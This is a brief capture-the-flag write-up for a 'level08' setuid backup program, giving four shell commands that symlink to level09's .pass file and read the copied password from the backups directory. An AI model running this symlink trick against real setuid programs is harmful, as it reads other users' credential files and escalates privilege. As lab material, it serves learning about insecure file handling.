this program is setuid by level09, as always, it does have the rights to open the .pass file own by level09
so we create a symlink that point to it, in a directory that we own, then we launch the program with this symlink as argument
the program will read the .pass and put his content into the backups directory

chmod 777 .
ln -s /home/users/level09/.pass exploit
./level08 exploit
cat backups/exploit
